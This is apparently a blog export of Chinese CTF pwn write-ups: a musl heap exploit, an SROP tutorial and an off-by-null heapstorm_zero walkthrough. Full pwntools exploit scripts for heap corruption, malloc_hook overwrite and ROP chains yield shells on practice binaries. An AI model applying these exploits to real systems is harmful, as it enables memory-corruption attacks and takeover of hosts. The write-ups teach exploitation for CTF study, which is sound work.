[rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;The index of your hw:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] ) &#123; puts(&quot;Input your hw:&quot;); read(0, qword_404140[v1], dword_4040E0[v1]); &#125; else &#123; puts(&quot;out of range!&quot;); &#125; return __readfsqword(0x28u) ^ v2;&#125; 思路通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块 expmusl做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等具体参考 https://my.oschina.net/u/2306127/blog/1592004 漏洞点add功能有一次堆溢出的机会 思路溢出修改size然后free造成overlappingfree时检查了in_use和下一个chunk的prev_size，提前伪造好prev_sizeoverlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器got plt都不可写，没有hook可以通过任意地址读写改写栈，getshell利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import syscontext.log_level = &apos;debug&apos;#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]if sys.argv[1]==&quot;l&quot;: r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;]) libc=ELF(&apos;libc.so&apos;)else: r=remote(&apos;119.3.158.103&apos;,19008) libc=ELF(&apos;libc.so&apos;)def add(size,data): r.recvuntil(&apos;&gt;&apos;) r.sendline(&apos;1&apos;) r.recvuntil(&apos;What is your prefer size? &gt;&apos;) r.sendline(str(size)) r.recvuntil(&apos;Are you a believer? &gt;&apos;) r.sendline(&apos;wdnmd&apos;) r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;) r.sendline(data)def gg_add(size,data): r.recvuntil(&apos;&gt;&apos;) r.sendline(&apos;1&apos;) r.recvuntil(&apos;What is your prefer size? &gt;&apos;) r.sendline(str(size)) r.recvuntil(&apos;Are you a believer? &gt;&apos;) r.sendline(&apos;Y\x00&apos;) r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;) r.sendline(data)def free(index): r.recvuntil(&apos;&gt;&apos;) r.sendline(&apos;2&apos;) r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;) r.sendline(str(index))def edit(index,data): r.recvuntil(&apos;&gt;&apos;) r.sendline(&apos;3&apos;) r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;) r.sendline(str(index)) sleep(0.5) r.sendline(data)def show(index): r.recvuntil(&apos;&gt;&apos;) r.sendline(&apos;4&apos;) r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;) r.sendline(str(index))heap_store = 0x602030#add-symbol-file libc.so 0x8000000#x/64gx 0x82953b0#x/20gx 0x00007fffff7e0000add(0x10,&apos;gg&apos;)#0add(0x30,&apos;gg&apos;)#1add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2add(0x40,&apos;gg&apos;)#3add(0x20,&apos;gg&apos;)#4add(0x20,p64(0x40)+p64(heap_store))#5free(0)gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0free(1)add(0x30,&apos;gg&apos;)#1add(0x30,&apos;gg&apos;)#2 6free(2)show(6)leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))info(hex(leak))gdb.attach(r)pause()libc_base = leak-0x292ad8log.success(hex(libc_base))system = libc_base+libc.sym[&apos;system&apos;]edit(6,p64(heap_store)*2)free(4)add(0x30,p64(heap_store))#pwnenviron = libc_base+0x294FD8log.success(hex(environ))add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 edit(5,p64(0))show(9)leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))stack_rsp = leak-0x118log.success(hex(stack_rsp))#gg_stack = 0x7ffffffee638#print(hex(gg_stack-stack_rsp))gg_stack = 0xa0+stack_rspbinsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_baseedit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))edit(5,p64(0))#show(12) test libc_addrpause()menu = 0x400c2fflag = libc_base+0x8295580-0x8000000pop_rdi_ret = libc_base+0x14862pop_rsi_ret = libc_base+0x1c237pop_rdx_ret = libc_base+0x1b92puts_addr = libc_base+libc.sym[&apos;puts&apos;]#edit(10,p64(menu)*10)edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))r.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SROP]]></title>
    <url>%2F2020%2F02%2F28%2FSROP%2F</url>
    <content type="text"><![CDATA[什么是SROPSROP 全称Sigreturn Oriented Programming，sigreturn是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。 signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示： 包含的流程包括： 内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。 内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。 执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。 保存在栈中的进程上下文信息为ucontext_t结构体，称其为Signal Frame，其结构体定义如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// defined in /usr/include/sys/ucontext.h/* Userlevel context. */typedef struct ucontext_t &#123; unsigned long int uc_flags; struct ucontext_t *uc_link; stack_t uc_stack; // the stack used by this context mcontext_t uc_mcontext; // the saved context sigset_t uc_sigmask; struct _libc_fpstate __fpregs_mem; &#125; ucontext_t;// defined in /usr/include/bits/types/stack_t.h/* Structure describing a signal stack. */typedef struct &#123; void *ss_sp; size_t ss_size; int ss_flags; &#125; stack_t;// difined in /usr/include/bits/sigcontext.hstruct sigcontext&#123; __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union &#123; struct _fpstate * fpstate; __uint64_t __fpstate_word; &#125;; __uint64_t __reserved1 [8];&#125;; 由于Signal Frame是在用户态的栈中，因此若在栈中伪造Signal Frame，同时调sigreturn系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。 如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。 如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤： 控制栈指针。 把原来 rip 指向的syscall gadget 换成syscall; ret gadget。 示意图如下所示。 实例以V&amp;N招新赛babypwn为例 思路如下： 程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *import syscontext.log_level='debug'context.arch='amd64'# context.arch='i386'vn_pwn_babypwn_1=ELF('./vn_pwn_babypwn_1', checksec = False)if context.arch == 'amd64': libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)elif context.arch == 'i386': try: libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False) except: libc=ELF("/lib32/libc.so.6", checksec = False)def get_sh(other_libc = null): global libc if args['REMOTE']: if other_libc is not null: libc = ELF("./", checksec = False) return remote(sys.argv[1], sys.argv[2]) else: return process("./vn_pwn_babypwn_1")def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False): sh.recvuntil(start_string) if int_mode : return_address=int(sh.recvuntil(end_string).strip(end_string),16) elif context.arch == 'amd64': return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'\x00')) else: return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'\x00')) log.success(info+str(hex(return_address+offset))) return return_address+offsetdef get_flag(sh): sh.sendline('cat /flag') return sh.recvrepeat(0.3)def get_gdb(sh,stop=False): gdb.attach(sh) if stop : raw_input()if __name__ == "__main__": sh = get_sh() get_gdb(sh) libc.address = get_address(sh,'The libc base address is ','Here is my gift: 0x','\n',-libc.symbols['puts'],True) sh.recvuntil('Please input magic message: ') fake_frame = p64(0) * 12 fake_frame += p64(0) # RDI = RAX fake_frame += p64(0) # RSI = RDI fake_frame += p64(0) # RBP fake_frame += p64(0) # RBX fake_frame += p64(libc.address + 0x3C6500 - 0x10) # RDX = RSI fake_frame += p64(0) # RAX fake_frame += p64(0x100) # RCX = RDX fake_frame += p64(libc.address + 0x3C6500) # RSP fake_frame += p64(libc.symbols['syscall']) # RIP fake_frame += p64(0) # eflags fake_frame += p64(0x33) # cs : gs : fs fake_frame += p64(0) * 7 # get_gdb(sh) sh.send(fake_frame) ROP_chain = '/flag\x00\x00\x00' ROP_chain += p64(0) ROP_chain += p64(libc.address + 0x0000000000021102) ROP_chain += p64(libc.address + 0x3C6500 - 0x10) ROP_chain += p64(libc.address + 0x00000000000202e8) ROP_chain += p64(0) ROP_chain += p64(libc.symbols['open']) ROP_chain += p64(libc.address + 0x0000000000021102) ROP_chain += p64(3) ROP_chain += p64(libc.address + 0x00000000000202e8) ROP_chain += p64(libc.address + 0x3C6700) ROP_chain += p64(libc.address + 0x0000000000001b92) ROP_chain += p64(0x100) ROP_chain += p64(libc.symbols['read']) ROP_chain += p64(libc.address + 0x0000000000021102) ROP_chain += p64(1) ROP_chain += p64(libc.address + 0x00000000000202e8) ROP_chain += p64(libc.address + 0x3C6700) ROP_chain += p64(libc.address + 0x0000000000001b92) ROP_chain += p64(0x100) ROP_chain += p64(libc.symbols['write']) #raw_input('&gt;') sh.send(ROP_chain) print sh.recv() 参考文章 : https://ray-cp.github.io/archivers/srop-analysis]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[off-by-null]]></title>
    <url>%2F2020%2F02%2F28%2Foff-by-null%2F</url>
    <content type="text"><![CDATA[前言off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。 题目链接 https://github.com/veritas501/hctf2018 程序分析直接拿源码分析，程序是一个比较简单的菜单程序 123456789101112131415161718192021222324252627int main(void)&#123; init(); while(1)&#123; switch(menu_getinput())&#123; case 1:&#123; Allocate(); break; &#125; case 2:&#123; View(); break; &#125; case 3:&#123; Delete(); break; &#125; case 4:&#123; puts(&quot;Bye!&quot;); exit(0); &#125; default:&#123; puts(&quot;Invaild choice!&quot;); &#125; &#125; &#125; return 0;&#125; 首先初始化一些东西，比如随机 mmap 一块内存用来存放指针之类的。然后提供三个选项供用户选择。 init看看 init 函数。 12345678910111213141516171819202122232425262728293031323334void init()&#123; sum=0; setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); int fd = open("/dev/urandom",0); if(fd&lt;0)&#123; printf("Open urandom error!!\n"); exit(-1); &#125; void * pageaddr; if(read(fd,&amp;pageaddr,sizeof(void *)) == -1)&#123; printf("Read urandom error!!\n"); exit(-1); &#125; pageaddr = (void *)(((size_t)(pageaddr)&amp;~0xfff)%0x133700000000); // 随机mmap 一块内存，存放程序分配的内存指针 page = mmap(pageaddr,0x1000,3,34,-1,0); if(page != pageaddr)&#123; printf("mmap error!!\n"); exit(-1); &#125; // 随机生成秘钥，用于加密指针 if(read(fd,&amp;(page-&gt;xorkey),sizeof(size_t)) == -1)&#123; printf("Read urandom error!!\n"); exit(-1); &#125; for(int i=0;i&lt;0x20;i++)&#123; page-&gt;chunk[i]=(char *)page-&gt;xorkey; &#125; bar(); close(fd);&#125; 分配一块内存，然后生成一个随机秘钥，秘钥的作用是把程序分配的内存的指针异或加密一下。 Allocate12345678910111213141516171819202122232425262728293031323334void Allocate()&#123; int i; if(sum &gt; 0x20u)&#123; puts("Too many chunks!"); exit(-1); &#125; printf("Please input chunk size:"); int size = read_int(); // size 最大为0x38 if(!check_chunksize(size))&#123; puts("Invalid size!"); exit(-1); &#125; char * p = (char *)calloc(size, 1); if(!p)&#123; puts("Alloc error!!"); exit(-1); &#125; printf("Please input chunk content:"); // read_n 会向p[size]='\x00',所以有一字节的溢出，溢出的字节为'\x00' read_n(p, size); for ( i = 0; i &lt;= 31 &amp;&amp; (size_t)page-&gt;chunk[i]^page-&gt;xorkey; ++i )&#123; &#125; if ( i == 32 )&#123; puts("Too many chunks!"); exit(-1); &#125; // 指针xor加密存放 page-&gt;chunk[i] = (char*)((size_t)p^page-&gt;xorkey); ++sum; printf("Chunk index: %d\n",i);&#125; 首先让用户输入一个 size , 然后判断 size 最大只能为 0x38 ， 这意味着我们只能分配 fastbin 的 chunk. 分配好内存后，会读入数据到里面，这时候会有一个 \x00 字节的溢出。 View就是把指针解密出来，然后用 printf 打印内容。 Delete解密出指针，然后释放掉，同时把相关的项设置为初始状态。123456789101112131415void Delete()&#123; printf("Please input chunk index: "); int idx = read_int(); if ( idx &lt; 0 || idx &gt; 31 )&#123; puts("Invalid index!"); exit(-1); &#125; char *p = (char*)((size_t)page-&gt;chunk[idx]^page-&gt;xorkey); if ( p ) &#123; --sum; free(p); page-&gt;chunk[idx] = (char*)(page-&gt;xorkey); &#125;&#125; 总结一下程序的功能。 我们最多只能 malloc(0x38) 即 0x40 大小的 chunk.有一个 打印 chunk 内容的函数。分配时可以 off by null. 利用分析简述一字节溢出的利用围绕着的是 堆块在分配，释放，合并时对 chunk 的 size 域的信任关系。而如果只是 fastbin 的话 off by null 是没法利用的，因为只要溢出就会把 size 设置为 0. 这里有一个 tips , 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。 在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有 fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。 于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个 smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。 信息泄露首先分配 12 个 chunk, 其中 第一个 和最后一个保留， 第一个 chunk 用于 触发 off-by-null ， 最后一个用于防止在 堆合并时与 top_chunk 进行合并。 123456789101112131415add(0x38, 'a') # 0add(0x28, 'a') # 1add(0x28, 'a') # 2add(0x18, 'a') # 3add(0x18, 'a') # 4add(0x38, 'x') # 5add(0x28, 'x') # 6add(0x38, 'x') # 7add(0x38, 'x') # 8add(0x38, 'x') # 9pay = 'a' * 0x20 + p64(0x200) + p64(0x20) # shrink chunk 前，配置好add(0x38, pay) # 10add(0x38, 'end') # 11 , 保留块， 防止和 top chunk 合并 然后把中间的 10 个 chunk 释放掉，同时触发 堆合并，构造一个 0x210 大小的 smallbin1234567# 释放掉 chunkfor i in range(1, 11): dele(i)# 利用 scanf 分配大内存 0x400+ , 会触发堆合并# fastbin 会合并进入 smallbintriger_consolidate() 函数 triger_consolidate 的逻辑就是发送 0x400 的字符串给 scanf 处理，然后 scanf 会分配大内存，触发 堆合并。 此时的内存布局如下 图中特殊标出的 0x200 | 0x20 用于保证后续利用过掉 check. 然后利用 chunk 0 , 溢出 一字节的 \x00 , 修改下面那个 smallbin 的 size —&gt; 0x200 1234# 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200dele(0)pay = 'a' * 0x38add(0x38, pay) # 0 紧接着在这个剩下的 0x200 字节的 smallbin 里面分配 8 个 chunk , 然后利用同样的方法，在里面构造一个 smallbin 1234567891011121314add(0x38, 'a' * 8) # 1add(0x38, 'b' * 8) # 2add(0x38, 'c' * 8) # 3add(0x38, 'x') # 4add(0x38, 'x') # 5add(0x28, 'x') # 6add(0x38, 'x') # 7add(0x38, 'x') # 8# 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0dele(1)dele(2)dele(3)triger_consolidate() 下面释放掉 chunk 11 123# 触发 overlapdele(11)triger_consolidate() 系统发现 chunk 11 的 pre_size 为 0 ，即表明前一个 chunk 是释放状态，同时 chunk 11 和 top_chunk 相邻，所以 即使 chunk 11 的大小在 fastbin 的范围内也会触发合并操作，于是会通过 chunk 11 的 pre_size ( 0x210 ) 找到上面那个 smallbin 的起始地址。 然后对 smallbin 做 unlink 操作， 此时 smallbin 已经在链表上，所以 unlink 可以通过，拆下来后进行合并， 合并之后形成了一个大 chunk. 这个 chunk 会继续和 top_chunk 合并变成 top_chunk 的一部分。注意到此时 chunk4 - chunk8 已经落入 top_chunk 里。 接下来通过类似的方法，分配多个 chunk ， 然后释放掉中间的一些的 chunk , 然后出发 堆合并，构造一个比较大的 smallbin12345678910111213141516171819202122add(0x28, &apos;a&apos;) # 1add(0x28, &apos;a&apos;) # 2add(0x18, &apos;a&apos;) # 3add(0x18, &apos;a&apos;) # 9add(0x38, &apos;1&apos; * 0x30) # 10add(0x38, &apos;2&apos; * 0x30) # 11add(0x28, &apos;3&apos; * 0x30) # 12add(0x38, &apos;4&apos; * 0x30) # 13add(0x38, &apos;5&apos; * 0x30) # 14pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)add(0x38, pay) # 15add(0x38, &apos;end&apos;) # 16dele(1)dele(2)dele(3)for i in range(9, 16): dele(i)triger_consolidate() 此时的内存状态如图 此时 chunk 4 - chunk 8 落入了新构造的 smallbin 里面。下面通过 不断的分配，会对这个 smallbin 进行切割，这个过程就会使得 一些链表用的指针落入到 还处于 使用状态的 chunk4 - chunk8 的某一个 chunk 里面， 然后利用 puts 功能，就可以打印指针的内容，造成信息泄露， 拿到 libc 的地址。 123456789101112131415161718### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来dele(0)pay = 'a' * 0x38add(0x38, pay) # 0### 再次 shrink chunk 利用切割smallbin遗留下的指针，leak libcadd(0x38, 'a' * 8) # 1add(0x38, 'b' * 8) # 2add(0x38, 'c' * 8) # 3view(4)p.recvuntil('Content: ')lbase = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) - 0x3c4b20 - 88success('lbase: ' + hex(lbase)) getshell能够 overlap chunk 后实现 getshell 的方式就很多了，下面 分析下 exp 的 getshell 方案。 123456789101112131415161718192021# fastbin dup, 利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size 0x41# 然后利用 fastbin attack 控制 main_arena-&gt;top.dele(5)dele(14)dele(0xc)dele(6)dele(15)dele(0xd)# 修改fastbin的fd为0x41,然后分配几次，让main_arean里面有0x41add(0x28, p64(0x41))add(0x28, 'a')add(0x28, 'a')add(0x38, p64(lbase + 0x3c4b20 + 8))add(0x38, 'a')add(0x38, 'a')# 利用之前在main_arean里面设置的0x41作为size分配到main_arean,然后修改top_chunk的地址为__malloc_hook-0x18add(0x38, p64(lbase + 0x3c4b20 + 8 + 0x20) + '\x00' * 0x10 + p64(0x41))add(0x38, '\x00' * 0x20 + p64(lbase + libc.sym['__malloc_hook'] - 0x18)) 利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size (0x41) 然后利用 fastbin attack 控制 main_arena-&gt;top然后就可以分配到 malloc_hook 附近，修改 malloc_hook 为 one_gadget. 最后利用 malloc_printerr 触发 one_gadget1234# 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free# malloc_printerr ---&gt; malloc_hook ---&gt; getshelldele(6)dele(8) 完整exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234#!/usr/bin/python# -*- coding: UTF-8 -*-from pwn import *from time import sleepfrom utils import *context.log_level = &quot;debug&quot;context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]path = &quot;./heapstorm_zero&quot;p = process(path, aslr=0)bin = ELF(path, checksec=False)libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;, checksec=False)# result = (unsigned int)(a1 - 1) &lt;= 0x37;def add(size, con): p.recvuntil(&apos;Choice:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;size:&apos;) p.sendline(str(size)) p.recvuntil(&apos;content:&apos;) p.sendline(con)def view(idx): p.recvuntil(&apos;Choice:&apos;) p.sendline(&apos;2&apos;) p.recvuntil(&apos;index:&apos;) p.sendline(str(idx))def dele(idx): p.recvuntil(&apos;Choice:&apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;index:&apos;) p.sendline(str(idx))def triger_consolidate(pay=&apos;&apos;): &quot;&quot;&quot; 利用 scanf(&quot;%d&quot;,&amp;n) 触发大内存分配，进而导致 内存合并。 :param pay: :return: &quot;&quot;&quot; p.recvuntil(&apos;Choice:&apos;) if pay == &apos;&apos;: p.sendline(&apos;1&apos; * 0x400) # malloc_consolidateadd(0x38, &apos;a&apos;) # 0add(0x28, &apos;a&apos;) # 1add(0x28, &apos;a&apos;) # 2add(0x18, &apos;a&apos;) # 3add(0x18, &apos;a&apos;) # 4add(0x38, &apos;x&apos;) # 5add(0x28, &apos;x&apos;) # 6add(0x38, &apos;x&apos;) # 7add(0x38, &apos;x&apos;) # 8add(0x38, &apos;x&apos;) # 9pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20) # shrink chunk 前，配置好add(0x38, pay) # 10add(0x38, &apos;end&apos;) # 11 , 保留块， 防止和 top chunk 合并# 释放掉 chunkfor i in range(1, 11): dele(i)# 利用 scanf 分配大内存 0x400+ , 会触发堆合并# fastbin 会合并进入 smallbintriger_consolidate()# 合并后 形成 0x210 大小的 smallbin# pwndbg&gt; x/4xg 0x555555757040# 0x555555757040: 0x0000000000000000 0x0000000000000211# 0x555555757050: 0x00002aaaab097d78 0x00002aaaab097d78# 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200dele(0)pay = &apos;a&apos; * 0x38add(0x38, pay) # 0gdb.attach(p)pause()add(0x38, &apos;a&apos; * 8) # 1add(0x38, &apos;b&apos; * 8) # 2add(0x38, &apos;c&apos; * 8) # 3add(0x38, &apos;x&apos;) # 4add(0x38, &apos;x&apos;) # 5add(0x28, &apos;x&apos;) # 6add(0x38, &apos;x&apos;) # 7add(0x38, &apos;x&apos;) # 8# 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0dele(1)dele(2)dele(3)triger_consolidate()# 触发 overlapdele(11)triger_consolidate()add(0x28, &apos;a&apos;) # 1add(0x28, &apos;a&apos;) # 2add(0x18, &apos;a&apos;) # 3add(0x18, &apos;a&apos;) # 9add(0x38, &apos;1&apos; * 0x30) # 10add(0x38, &apos;2&apos; * 0x30) # 11add(0x28, &apos;3&apos; * 0x30) # 12add(0x38, &apos;4&apos; * 0x30) # 13add(0x38, &apos;5&apos; * 0x30) # 14pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)add(0x38, pay) # 15add(0x38, &apos;end&apos;) # 16# 此时会有 指针交叉dele(1)dele(2)dele(3)for i in range(9, 16): dele(i)triger_consolidate()### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来dele(0)pay = &apos;a&apos; * 0x38add(0x38, pay) # 0### 再次 shrink chunkadd(0x38, &apos;a&apos; * 8) # 1add(0x38, &apos;b&apos; * 8) # 2add(0x38, &apos;c&apos; * 8) # 3view(4)p.recvuntil(&apos;Content: &apos;)lbase = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) - 0x3c4b20 - 88success(&apos;lbase: &apos; + hex(lbase))dele(1)dele(2)dele(3)triger_consolidate()### 让 heap 回到 shrink chunk 后的情况&quot;&quot;&quot;pwndbg&gt; binsfastbins32: 0x048: 0x064: 0x080: 0x096: 0x0112: 0x0128: 0x0unsortedbinall: 0x0smallbins512: 0x603040 —▸ 0x2aaaab097d68 (main_arena+584) ◂— 0x603040 /* u&apos;@0`&apos; */largebinsemptypwndbg&gt; x/4xg 0x6030400x603040: 0x6161616161616161 0x00000000000002010x603050: 0x00002aaaab097d68 0x00002aaaab097d68pwndbg&gt;&quot;&quot;&quot;add(0x18, &apos;A&apos; * 0x10) # 1add(0x28, &apos;B&apos; * 0x20) # 2add(0x38, &apos;C&apos; * 0x30) # 3add(0x18, &apos;D&apos; * 0x10) # 9pay = p64(0) + p64(0x41)add(0x18, pay) # 6add(0x28, &apos;asd&apos;)add(0x38, &apos;zxc&apos;) # 5,cadd(0x28, &apos;qqq&apos;) # 6,dadd(0x38, &apos;a1&apos;) # 14add(0x28, &apos;a2&apos;) # 15# fastbin dup, 利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size 0x41# 然后利用 fastbin attack 控制 main_arena-&gt;top.dele(5)dele(14)dele(0xc)dele(6)dele(15)dele(0xd)add(0x28, p64(0x41))add(0x28, &apos;a&apos;)add(0x28, &apos;a&apos;)add(0x38, p64(lbase + 0x3c4b20 + 8))add(0x38, &apos;a&apos;)add(0x38, &apos;a&apos;)add(0x38, p64(lbase + 0x3c4b20 + 8 + 0x20) + &apos;\x00&apos; * 0x10 + p64(0x41))add(0x38, &apos;\x00&apos; * 0x20 + p64(lbase + libc.sym[&apos;__malloc_hook&apos;] - 0x18))# 把 unsorted bin 分配掉add(0x18, &apos;a&apos; * 0x18)# 使用 top_chunk 分配，此时 top_chunk 位于 malloc_hook 上方， 修改 malloc_hookadd(0x18, p64(lbase + 0xf02a4) * 2)# gdb.attach(p)# pause()# 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free# malloc_printerr ---&gt; malloc_hook ---&gt; getshelldele(6)dele(8)p.interactive() 12345678910111213141516171819[*] Switching to interactive mode [DEBUG] Received 0x5b bytes: &quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***\n&quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***$ id[DEBUG] Sent 0x3 bytes: &apos;id\n&apos;[DEBUG] Received 0x84 bytes: 00000000 75 69 64 3d 31 30 30 30 28 6a 69 6e 67 29 20 67 │uid=│1000│(jin│g) g│ 00000010 69 64 3d 31 30 30 30 28 6a 69 6e 67 29 20 e7 bb │id=1│000(│jing│) ··│ 00000020 84 3d 31 30 30 30 28 6a 69 6e 67 29 2c 34 28 61 │·=10│00(j│ing)│,4(a│ 00000030 64 6d 29 2c 32 34 28 63 64 72 6f 6d 29 2c 32 37 │dm),│24(c│drom│),27│ 00000040 28 73 75 64 6f 29 2c 33 30 28 64 69 70 29 2c 34 │(sud│o),3│0(di│p),4│ 00000050 36 28 70 6c 75 67 64 65 76 29 2c 31 31 33 28 6c │6(pl│ugde│v),1│13(l│ 00000060 70 61 64 6d 69 6e 29 2c 31 32 38 28 73 61 6d 62 │padm│in),│128(│samb│ 00000070 61 73 68 61 72 65 29 2c 39 39 39 28 64 6f 63 6b │asha│re),│999(│dock│ 00000080 65 72 29 0a │er)·││ 00000084uid=1000(jing) gid=1000(jing) 组=1000(jing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(docker) 另一种布局为进一步理解 off by null , 下面以另一个 exp 的信息泄露过程为例介绍下堆的布局 来源 https://xz.aliyun.com/t/3253#toc-2首先分配若干个 chunk , 释放掉其中的第一个 chunk ，利用 scanf 触发堆合并构造 smallbin123456789101112131415add(0x18, "AAA\n")for i in range(24): add(0x38, "A" * 8 + str(i) + "\n")free(0)free(4)free(5)free(6)free(7)free(8)free(9)# 触发堆合并， 构造 2 个 ， smallbinsla("Choice:", "1" * 0x500) 此时 chunk 10 的 pre_size 为 0x180 , pre_inused = 0. 图中颜色定义如下 然后分配一个 0x40 的 chunk , 此时会用 0x180 大小的 smallbin 分配，分配后应该剩下 0x140 大小的 unsorted bin (bin 切割后会保存在 unsorted bin ) , 然后利用 off by null , 修改 unsorted bin 的大小为 0x100. 此时会出现 0x40 的空隙。 1234# 分配比较大的内存，使用较大的 smallbin , 